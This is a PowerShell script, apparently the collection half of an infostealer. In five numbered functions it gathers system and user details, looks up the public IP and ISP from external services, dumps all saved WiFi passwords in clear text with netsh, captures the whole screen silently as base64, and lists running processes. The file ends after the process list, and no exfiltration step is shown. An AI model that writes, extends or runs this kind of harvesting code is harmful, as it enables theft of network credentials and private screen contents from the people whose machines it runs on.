# ---------- 1. SYSTEM INFORMATION ----------
function Get-SystemInfo {
    try {
        $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue
        $os = Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue
        $cpu = Get-WmiObject Win32_Processor -ErrorAction SilentlyContinue
        $disk = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue
        $gpu = Get-WmiObject Win32_VideoController -ErrorAction SilentlyContinue | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1
        return @{
            ComputerName = $env:COMPUTERNAME
            UserName = $env:USERNAME
            Domain = $cs.Domain
            Manufacturer = $cs.Manufacturer
            Model = $cs.Model
            TotalRAM_GB = [math]::Round($cs.TotalPhysicalMemory/1GB,2)
            CPU = $cpu.Name
            Cores = $cpu.NumberOfCores
            OS = "$($os.Caption) Build $($os.BuildNumber)"
            Disk = ($disk | ForEach-Object {"$($_.DeviceID) $([math]::Round($_.FreeSpace/1GB,1))GB free of $([math]::Round($_.Size/1GB,1))GB"}) -join "; "
            GPU = $gpu.Name
        }
    } catch { return @{Error="SystemInfo: $($_.Exception.Message)"} }
}

# ---------- 2. NETWORK & IP ----------
function Get-NetworkInfo {
    try {
        $public = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content.Trim()
        $local = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.*"} | Select-Object -First 1).IPAddress
        $isp = (Invoke-WebRequest -Uri "https://ipinfo.io/org" -UseBasicParsing -TimeoutSec 5).Content.Trim()
        $mac = (Get-NetAdapter -Physical -ErrorAction SilentlyContinue | Where-Object {$_.Status -eq "Up"} | Select-Object -First 1).MacAddress
        return @{ PublicIP=$public; LocalIP=$local; ISP=$isp; MAC=$mac }
    } catch { return @{Error="Network: $($_.Exception.Message)"} }
}

# ---------- 3. WIFI PASSWORDS ----------
function Get-WiFiPasswords {
    $profiles = netsh wlan show profiles | Select-String " : " | ForEach-Object { ($_ -split ":")[1].Trim() }
    $result = @()
    foreach ($p in $profiles) {
        $output = netsh wlan show profile name="$p" key=clear | Select-String "Key Content"
        $pass = if ($output) { ($output -split ":")[1].Trim() } else { "(none)" }
        $result += "$p : $pass"
    }
    return ($result -join "`n")
}

# ---------- 4. SCREENSHOT (BASE64) ----------
function Get-ScreenshotBase64 {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $bytes = $ms.ToArray()
        $ms.Close()
        return [Convert]::ToBase64String($bytes)
    } catch { return "Screenshot failed" }
}

# ---------- 5. PROCESS LIST ----------
function Get-ProcessList {
    try {
        $procs = Get-Process -ErrorAction SilentlyContinue | Sort-Object -Property CPU -Descending | Select-Object -First 20
        return ($procs | ForEach-Object {"$($_.ProcessName) PID:$($_.Id) CPU:$($_.CPU) MB:$([math]::Round($_.WorkingSet/1MB,1))"}) -join "`n"
    } catch { return "Process error" }
}

